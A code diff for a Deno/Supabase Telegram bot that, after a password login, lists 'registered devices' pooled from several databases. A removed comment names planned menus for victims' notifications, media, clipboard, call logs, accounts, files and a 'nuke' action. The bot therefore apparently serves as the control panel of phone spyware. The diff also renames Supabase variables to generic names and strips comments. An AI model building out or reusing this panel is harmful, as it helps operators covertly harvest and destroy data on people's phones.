@@ -3,15 +3,15 @@ import { serve } from "https://deno.land/std@0.131.0/http/server.ts";
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 // ============================================================
-// قراءة المتغيرات من البيئة (لا شيء ثابت في الكود)
+// قراءة المتغيرات من البيئة (باستخدام أسماء DB_ بدلاً من SUPABASE_)
 // ============================================================
 const BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN") || "";
 const MASTER_PASSWORD = Deno.env.get("MASTER_PASSWORD") || "";
 const PROJECTS: any[] = [];
 
 for (let i = 1; i <= 4; i++) {
-  const url = Deno.env.get(`SUPABASE_URL_${i}`);
-  const key = Deno.env.get(`SUPABASE_KEY_${i}`);
+  const url = Deno.env.get(`DB_URL_${i}`);
+  const key = Deno.env.get(`DB_KEY_${i}`);
   if (url && key) {
     PROJECTS.push({
       id: i,
@@ -34,7 +34,6 @@ async function sendTelegram(method: string, payload: any) {
 }
 
 async function updateSession(chatId: number) {
-  // لكل مشروع نحدّث آخر نشاط (نستخدم المشروع الأول للتخزين المؤقت)
   if (PROJECTS.length > 0) {
     await PROJECTS[0].client
       .from("sessions")
@@ -65,7 +64,6 @@ async function isBanned(chatId: number): Promise<boolean> {
   return !!data;
 }
 
-// دوال لجلب البيانات من كل المشاريع
 async function fetchCombined(table: string, limit = 10) {
   const promises = PROJECTS.map((p) =>
     p.client.from(table).select("*").order("created_at", { ascending: false }).limit(limit)
@@ -81,7 +79,7 @@ async function fetchCombined(table: string, limit = 10) {
 }
 
 // ============================================================
-// القوائم (بالإنجليزية لأنها داخل الكود، النصوص العربية ستُرسل للمستخدم)
+// القوائم (بالإنجليزية)
 // ============================================================
 const MAIN_KEYBOARD = {
   inline_keyboard: [
@@ -106,22 +104,18 @@ const MAIN_KEYBOARD = {
 serve(async (req) => {
   const update = await req.json();
 
-  // الرسائل النصية
   if (update.message) {
     const chatId = update.message.chat.id;
     const text = update.message.text || "";
 
-    // التحقق من الحظر
     if (await isBanned(chatId)) {
       await sendTelegram("sendMessage", { chat_id: chatId, text: "⛔ You are banned." });
       return new Response("ok");
     }
 
-    // /login
     if (text.startsWith("/login ")) {
       const pass = text.split(" ")[1];
       if (pass === MASTER_PASSWORD) {
-        // إنشاء جلسة جديدة
         await PROJECTS[0].client
           .from("sessions")
           .upsert({ chat_id: chatId, last_activity: new Date().toISOString() });
@@ -136,7 +130,6 @@ serve(async (req) => {
       return new Response("ok");
     }
 
-    // /start
     if (text === "/start") {
       await sendTelegram("sendMessage", {
         chat_id: chatId,
@@ -146,7 +139,6 @@ serve(async (req) => {
     }
   }
 
-  // معالجة الأزرار (callback_query)
   if (update.callback_query) {
     const cb = update.callback_query;
     const chatId = cb.message.chat.id;
@@ -155,7 +147,6 @@ serve(async (req) => {
 
     await sendTelegram("answerCallbackQuery", { callback_query_id: cb.id });
 
-    // التحقق من الحظر والجلسة لجميع الأزرار ما عدا /login
     if (await isBanned(chatId)) {
       await sendTelegram("sendMessage", { chat_id: chatId, text: "⛔ You are banned." });
       return new Response("ok");
@@ -168,17 +159,14 @@ serve(async (req) => {
       });
       return new Response("ok");
     }
-    // تحديث وقت الجلسة
     await updateSession(chatId);
 
-    // التعامل مع الأزرار حسب البيانات
     if (data === "logout") {
       await PROJECTS[0].client.from("sessions").delete().eq("chat_id", chatId);
       await sendTelegram("sendMessage", { chat_id: chatId, text: "👋 Logged out." });
       return new Response("ok");
     }
 
-    // قائمة الأجهزة
     if (data === "menu_devices") {
       const devices = await fetchCombined("pos_clients", 10);
       let text = "📱 *Registered devices:*\n";
@@ -195,7 +183,6 @@ serve(async (req) => {
       return new Response("ok");
     }
 
-    // العودة للقائمة الرئيسية
     if (data === "back_main") {
       await sendTelegram("editMessageText", {
         chat_id: chatId,
@@ -206,8 +193,7 @@ serve(async (req) => {
       return new Response("ok");
     }
 
-    // يمكن إضافة باقي الأزرار بنفس النمط (menu_notifs, menu_media, menu_clipboard, menu_apps, menu_social, menu_nuke, menu_files, menu_calllogs, menu_accounts, show_storage)
-    // نكتفي بهذا القدر للتوضيح
+    // يمكن إضافة باقي الأزرار بنفس النمط
   }
 
   return new Response("ok");
